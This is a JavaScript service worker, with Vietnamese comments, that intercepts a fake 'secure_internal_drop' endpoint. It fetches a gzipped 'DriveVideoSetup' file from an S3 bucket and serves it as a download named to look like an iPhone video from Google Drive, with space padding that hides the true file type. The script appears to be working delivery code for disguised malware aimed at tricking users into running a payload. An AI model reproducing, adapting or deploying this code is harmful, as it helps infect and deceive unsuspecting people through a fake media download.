self.addEventListener('install', () => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', (event) => {
  const requestUrl = new URL(event.request.url);

  // Kiểm tra Service Worker đã hoạt động
  if (requestUrl.pathname === '/drive_secure_download_ping') {
    event.respondWith(
      new Response('pong', {
        status: 200,
        headers: {
          'Content-Type': 'text/plain; charset=utf-8',
          'Cache-Control': 'no-store'
        }
      })
    );

    return;
  }

  // Endpoint tải nội bộ
  if (requestUrl.pathname === '/secure_internal_drop/') {
    event.respondWith(createDownloadResponse());
  }
});

async function createDownloadResponse() {
  const gzipUrl =
    'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';

  const outputFilename =
    'Video_recorded_iPhone15.mp4   Drive.google.com';

  try {
    if (typeof DecompressionStream !== 'function') {
      throw new Error(
        'Trình duyệt không hỗ trợ DecompressionStream.'
      );
    }

    const response = await fetch(gzipUrl, {
      method: 'GET',
      mode: 'cors',
      credentials: 'omit',
      cache: 'no-store',
      redirect: 'follow'
    });

    if (!response.ok) {
      throw new Error(
        `S3 returned HTTP ${response.status} ${response.statusText}`
      );
    }

    if (!response.body) {
      throw new Error('S3 response body is empty.');
    }

    const decompressedStream =
      response.body.pipeThrough(
        new DecompressionStream('gzip')
      );

    return new Response(decompressedStream, {
      status: 200,
      headers: {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition':
          `attachment; filename="${outputFilename}"`,
        'Cache-Control': 'no-store',
        'X-Content-Type-Options': 'nosniff'
      }
    });
  } catch (error) {
    console.error('Download failed:', error);

    return new Response(
      `Download failed: ${error.message}`,
      {
        status: 500,
        headers: {
          'Content-Type': 'text/plain; charset=utf-8',
          'Cache-Control': 'no-store'
        }
      }
    );
  }
}